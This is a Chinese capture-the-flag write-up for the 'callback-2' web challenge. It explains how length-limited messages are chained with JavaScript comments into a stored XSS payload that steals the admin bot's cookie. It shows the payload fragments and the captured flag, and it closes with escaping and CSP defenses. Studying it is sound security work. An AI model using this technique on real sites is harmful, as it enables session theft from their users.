# callback-2

## 题目简述

第二版把 name、phone 限制为 12 字符，单条 message 限制为 20 字符，但同一用户可以提交任意多条消息，管理员页面仍按顺序未转义拼接。可用 JavaScript 注释跨越模板插入的标签，把一段完整脚本拆成许多不超过 20 字符的片段。

## 解题过程

第一条打开脚本并进入块注释：

~~~html
<script>/*
~~~

中间每条先关闭上一段注释，定义一个短变量，再重新打开注释，例如：

~~~javascript
*/let a="https";/*
*/let b="://CO";/*
~~~

将接收地址拆为短片段后，再用若干条语句拼接 URL、读取 document.cookie 并 fetch，最后以：

~~~html
*/</script>
~~~

结束。模板在消息之间插入的 HTML 全部落在 /* ... */ 内，不影响脚本语法。所有留言使用同一 name，再计算 sha1(name)，让管理员机器人访问对应面板。外带结果为：

~~~text
maple{d4ng_d4ngl3r_d4ngl1ng_d4ngl3d_h7ml}
~~~

## 方法总结

单字段长度限制不能替代上下文转义；多个记录在页面中串联后会形成更大的解释上下文。防御应对每条消息做 HTML 转义，并使用严格 CSP。测试这类绕过时要把模板自动插入的标签也纳入最终 HTML，而不是只验证各片段本身长度。
